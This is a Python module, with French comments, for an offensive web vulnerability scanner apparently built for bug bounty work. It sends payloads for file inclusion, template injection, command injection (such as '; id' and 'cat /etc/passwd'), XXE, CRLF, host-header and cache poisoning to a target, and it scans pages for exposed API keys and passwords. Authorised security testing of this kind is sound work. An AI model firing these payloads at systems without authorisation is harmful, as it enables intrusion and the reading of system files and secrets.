"""Module de scan agressif/offensif pour WebBounty."""

from __future__ import annotations

import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

import requests

from .utils import (
    Finding,
    build_url_with_params,
    extract_params_from_url,
    get_base_url,
    normalize_url,
    safe_request,
)

# --- Payloads offensifs ---

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "....\\....\\....\\etc\\passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
]

LFI_INDICATORS = ["root:x:", "daemon:x:", "[boot loader]", "for 16-bit"]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{config}}", "config"),
    ("${T(java.lang.Runtime)}", "Runtime"),
    ("{7*7}", "49"),
    ("[[7*7]]", "49"),
    ("${{7*7}}", "49"),
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "%0aid",
    "%0awhoami",
    ";cat /etc/passwd",
    "|cat /etc/passwd",
]

CMDI_INDICATORS = ["uid=", "gid=", "root:", "www-data", "nobody", "/bin/bash", "/bin/sh"]

XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: injected=true",
    "%0d%0aX-Injected: bountystrike",
    "%0aX-Injected: bountystrike",
    "%0dSet-Cookie: session=hijacked",
]

HOST_HEADER_PAYLOADS = [
    "evil.com",
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "internal.local",
    "metadata.google.internal",
]

SENSITIVE_PARAMS = [
    "file", "path", "page", "include", "doc", "document", "folder",
    "root", "pg", "template", "view", "content", "layout", "mod",
    "conf", "config", "dir", "action", "board", "date", "detail",
    "download", "prefix", "lang", "language", "country", "redirect",
    "url", "uri", "load", "read", "filename", "filepath", "cat",
    "cmd", "exec", "command", "execute", "ping", "query", "code",
    "expr", "expression", "input", "data", "xml", "json", "body",
]

IDOR_PARAMS = ["id", "user_id", "userid", "uid", "account", "order", "invoice", "doc", "file_id"]


class AggressiveScanner:
    """Scanner offensif — LFI, SSTI, CMDi, XXE, Host injection, IDOR, etc."""

    def __init__(
        self,
        target: str,
        session: requests.Session,
        threads: int = 10,
    ):
        self.target = normalize_url(target)
        self.base_url = get_base_url(self.target)
        self.session = session
        self.threads = threads
        self.findings: list[Finding] = []

    def run_full_scan(self, urls: list[str] | None = None) -> list[Finding]:
        """Lance tous les tests agressifs."""
        scan_urls = (urls or [self.target])[:15]

        self.test_host_header_injection()
        self.test_crlf_injection()
        self.test_http_request_smuggling_hint()

        for url in scan_urls:
            self.test_lfi(url)
            self.test_ssti(url)
            self.test_cmdi(url)
            self.test_idor(url)
            self.test_parameter_pollution(url)

        self.test_xxe()
        self.test_cache_poisoning()
        self.scan_for_secrets_in_source()

        return self.findings

    def test_lfi(self, url: str) -> None:
        """Test Local File Inclusion."""
        params = extract_params_from_url(url)
        base = url.split("?")[0]
        test_params = list(params.keys()) if params else SENSITIVE_PARAMS[:8]

        for param in test_params[:6]:
            for payload in LFI_PAYLOADS[:5]:
                test_url = build_url_with_params(base, {param: payload})
                resp = safe_request(self.session, "GET", test_url)
                if not resp:
                    continue
                for indicator in LFI_INDICATORS:
                    if indicator in resp.text:
                        self.findings.append(
                            Finding(
                                title=f"LFI détecté — paramètre '{param}'",
                                severity="critical",
                                category="Local File Inclusion",
                                url=test_url,
                                description="Contenu de fichier système lu via LFI",
                                evidence=f"Indicator: {indicator}, Payload: {payload}",
                                remediation="Valider et sanitiser les chemins de fichiers",
                            )
                        )
                        return

    def test_ssti(self, url: str) -> None:
        """Test Server-Side Template Injection."""
        params = extract_params_from_url(url)
        base = url.split("?")[0]
        test_params = list(params.keys()) if params else ["name", "q", "search", "template", "message", "text"]

        for param in test_params[:5]:
            for payload, expected in SSTI_PAYLOADS[:6]:
                test_url = build_url_with_params(base, {param: payload})
                resp = safe_request(self.session, "GET", test_url)
                if not resp:
                    continue
                if expected in resp.text and payload not in resp.text:
                    self.findings.append(
                        Finding(
                            title=f"SSTI détecté — paramètre '{param}'",
                            severity="critical",
                            category="Server-Side Template Injection",
                            url=test_url,
                            description=f"Expression évaluée côté serveur: {payload} → {expected}",
                            evidence=f"Payload: {payload}, Response contains: {expected}",
                            remediation="Ne jamais passer d'input utilisateur aux moteurs de template",
                        )
                    )
                    return

    def test_cmdi(self, url: str) -> None:
        """Test Command Injection."""
        params = extract_params_from_url(url)
        base = url.split("?")[0]
        test_params = list(params.keys()) if params else ["cmd", "exec", "command", "ping", "ip", "host"]

        for param in test_params[:4]:
            for payload in CMDI_PAYLOADS[:6]:
                test_url = build_url_with_params(base, {param: payload})
                resp = safe_request(self.session, "GET", test_url)
                if not resp:
                    continue
                for indicator in CMDI_INDICATORS:
                    if indicator in resp.text:
                        self.findings.append(
                            Finding(
                                title=f"Command Injection — paramètre '{param}'",
                                severity="critical",
                                category="Command Injection",
                                url=test_url,
                                description="Exécution de commande système détectée",
                                evidence=f"Indicator: {indicator}, Payload: {payload}",
                                remediation="Ne jamais passer d'input utilisateur au shell",
                            )
                        )
                        return

    def test_xxe(self) -> None:
        """Test XML External Entity injection."""
        xml_endpoints = [
            f"{self.base_url}/api",
            f"{self.base_url}/xml",
            f"{self.base_url}/soap",
            f"{self.base_url}/ws",
            f"{self.base_url}/upload",
            self.target,
        ]
        for endpoint in xml_endpoints:
            resp = safe_request(
                self.session,
                "POST",
                endpoint,
                data=XXE_PAYLOAD,
                headers={"Content-Type": "application/xml"},
            )
            if not resp:
                continue
            if "root:x:" in resp.text or "daemon:x:" in resp.text:
                self.findings.append(
                    Finding(
                        title="XXE (XML External Entity) détecté",
                        severity="critical",
                        category="XXE",
                        url=endpoint,
                        description="Lecture de fichier via entité externe XML",
                        evidence=resp.text[:300],
                        remediation="Désactiver les entités externes dans le parseur XML",
                    )
                )
                return

    def test_host_header_injection(self) -> None:
        """Test Host Header Injection / Password reset poisoning."""
        for host in HOST_HEADER_PAYLOADS:
            resp = safe_request(
                self.session,
                "GET",
                self.target,
                headers={"Host": host, "X-Forwarded-Host": host},
            )
            if not resp:
                continue
            if host in resp.text:
                self.findings.append(
                    Finding(
                        title=f"Host Header Injection — Host: {host}",
                        severity="high",
                        category="Host Header Injection",
                        url=self.target,
                        description="La valeur du Host header est réfléchie dans la réponse",
                        evidence=f"Host: {host} found in response",
                        remediation="Valider le Host header contre une whitelist",
                    )
                )
                return

            # Password reset poisoning via X-Forwarded-Host
            location = resp.headers.get("Location", "")
            if host in location:
                self.findings.append(
                    Finding(
                        title="Password Reset Poisoning via Host header",
                        severity="high",
                        category="Host Header Injection",
                        url=self.target,
                        description="Host injecté dans une redirection",
                        evidence=f"Location: {location}",
                        remediation="Utiliser un domaine fixe pour les liens de reset",
                    )
                )

    def test_crlf_injection(self) -> None:
        """Test CRLF / HTTP Response Splitting."""
        for payload in CRLF_PAYLOADS:
            test_url = build_url_with_params(self.target, {"redirect": payload, "url": payload, "next": payload})
            resp = safe_request(self.session, "GET", test_url, allow_redirects=False)
            if not resp:
                continue
            if "injected" in str(resp.headers).lower() or "X-Injected" in str(resp.headers):
                self.findings.append(
                    Finding(
                        title="CRLF Injection / HTTP Response Splitting",
                        severity="high",
                        category="CRLF Injection",
                        url=test_url,
                        description="Injection d'en-têtes HTTP via CRLF",
                        evidence=str(dict(resp.headers))[:300],
                        remediation="Encoder les retours chariot dans les redirections",
                    )
                )
                return

    def test_idor(self, url: str) -> None:
        """Test Insecure Direct Object Reference."""
        params = extract_params_from_url(url)
        base = url.split("?")[0]

        for param in IDOR_PARAMS:
            if param not in params and param not in url.lower():
                continue

            original_val = params.get(param, "1")
            test_ids = ["1", "2", "100", "999", "0", "-1", "admin"]

            responses: dict[str, int] = {}
            for test_id in test_ids:
                test_url = build_url_with_params(base, {**params, param: test_id})
                resp = safe_request(self.session, "GET", test_url)
                if resp:
                    responses[test_id] = resp.status_code

            # Si plusieurs IDs retournent 200 avec des tailles différentes
            success_ids = [tid for tid, code in responses.items() if code == 200]
            if len(success_ids) >= 3:
                self.findings.append(
                    Finding(
                        title=f"IDOR potentiel — paramètre '{param}'",
                        severity="high",
                        category="IDOR",
                        url=url,
                        description=f"Accès à plusieurs ressources via {param}={success_ids}",
                        evidence=f"Status codes: {responses}",
                        remediation="Vérifier l'autorisation pour chaque objet accédé",
                    )
                )

    def test_parameter_pollution(self, url: str) -> None:
        """Test HTTP Parameter Pollution."""
        base = url.split("?")[0]
        polluted = f"{base}?id=1&id=2&id=admin"
        resp = safe_request(self.session, "GET", polluted)
        if resp and resp.status_code == 200:
            if "admin" in resp.text.lower():
                self.findings.append(
                    Finding(
                        title="HTTP Parameter Pollution (HPP)",
                        severity="medium",
                        category="Parameter Pollution",
                        url=polluted,
                        description="Duplication de paramètres peut bypasser des filtres",
                        evidence="id=1&id=2&id=admin",
                        remediation="Normaliser les paramètres dupliqués côté serveur",
                    )
                )

    def test_http_request_smuggling_hint(self) -> None:
        """Détecte les indices de HTTP Request Smuggling."""
        # CL.TE hint
        try:
            resp = self.session.post(
                self.target,
                headers={
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                data="0\r\n\r\nG",
                timeout=self.session.timeout,
            )
            if resp.status_code in (400, 500) and "smuggling" in resp.text.lower():
                self.findings.append(
                    Finding(
                        title="HTTP Request Smuggling possible",
                        severity="critical",
                        category="Request Smuggling",
                        url=self.target,
                        description="Le serveur semble vulnérable au request smuggling",
                        evidence=resp.text[:200],
                        remediation="Utiliser HTTP/2 ou normaliser les requêtes au proxy",
                    )
                )
        except requests.RequestException:
            pass

    def test_cache_poisoning(self) -> None:
        """Test Cache Poisoning via headers."""
        poison_headers = [
            {"X-Forwarded-Host": "evil.com"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-Scheme": "nothttps"},
        ]
        for headers in poison_headers:
            resp = safe_request(self.session, "GET", self.target, headers=headers)
            if not resp:
                continue
            header_val = list(headers.values())[0]
            if header_val in resp.text:
                self.findings.append(
                    Finding(
                        title=f"Web Cache Poisoning — {list(headers.keys())[0]}",
                        severity="high",
                        category="Cache Poisoning",
                        url=self.target,
                        description="Header non standard réfléchi — empoisonnement de cache possible",
                        evidence=f"{list(headers.keys())[0]}: {header_val}",
                        remediation="Ne pas inclure de headers non standards dans les réponses cachées",
                    )
                )

    def scan_for_secrets_in_source(self) -> None:
        """Scanne le code source pour des secrets exposés."""
        resp = safe_request(self.session, "GET", self.target)
        if not resp:
            return

        secret_patterns = [
            (r"AKIA[0-9A-Z]{16}", "AWS Access Key", "critical"),
            (r"(?i)aws[_-]?secret[_-]?access[_-]?key\s*[=:]\s*['\"][A-Za-z0-9/+=]{40}['\"]", "AWS Secret Key", "critical"),
            (r"sk_live_[0-9a-zA-Z]{24,}", "Stripe Live Key", "critical"),
            (r"sk_test_[0-9a-zA-Z]{24,}", "Stripe Test Key", "high"),
            (r"ghp_[0-9a-zA-Z]{36}", "GitHub Personal Access Token", "critical"),
            (r"gho_[0-9a-zA-Z]{36}", "GitHub OAuth Token", "critical"),
            (r"xox[baprs]-[0-9a-zA-Z-]{10,}", "Slack Token", "critical"),
            (r"(?i)api[_-]?key\s*[=:]\s*['\"][A-Za-z0-9_\-]{20,}['\"]", "API Key hardcodée", "high"),
            (r"(?i)password\s*[=:]\s*['\"][^'\"]{8,}['\"]", "Mot de passe hardcodé", "critical"),
            (r"(?i)secret\s*[=:]\s*['\"][A-Za-z0-9_\-]{16,}['\"]", "Secret hardcodé", "high"),
            (r"-----BEGIN (RSA |EC )?PRIVATE KEY-----", "Clé privée exposée", "critical"),
            (r"(?i)mongodb(\+srv)?://[^\s\"']+", "MongoDB Connection String", "critical"),
            (r"(?i)postgres(ql)?://[^\s\"']+", "PostgreSQL Connection String", "critical"),
            (r"(?i)mysql://[^\s\"']+", "MySQL Connection String", "critical"),
        ]

        for pattern, name, severity in secret_patterns:
            matches = re.findall(pattern, resp.text)
            if matches:
                self.findings.append(
                    Finding(
                        title=f"Secret exposé: {name}",
                        severity=severity,
                        category="Secret Exposure",
                        url=self.target,
                        description=f"{name} trouvé dans le code source",
                        evidence=str(matches[0])[:100] + "...",
                        remediation="Révoquer le secret et utiliser des variables d'environnement",
                    )
                )

        # Scanner les fichiers JS
        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', resp.text, re.I)
        for js_url in js_urls[:5]:
            full_url = urllib.parse.urljoin(self.base_url, js_url)
            js_resp = safe_request(self.session, "GET", full_url)
            if not js_resp:
                continue
            for pattern, name, severity in secret_patterns[:8]:
                matches = re.findall(pattern, js_resp.text)
                if matches:
                    self.findings.append(
                        Finding(
                            title=f"Secret dans JS: {name}",
                            severity=severity,
                            category="Secret Exposure",
                            url=full_url,
                            description=f"{name} dans fichier JavaScript",
                            evidence=str(matches[0])[:100],
                            remediation="Ne jamais inclure de secrets dans le code client",
                        )
                    )
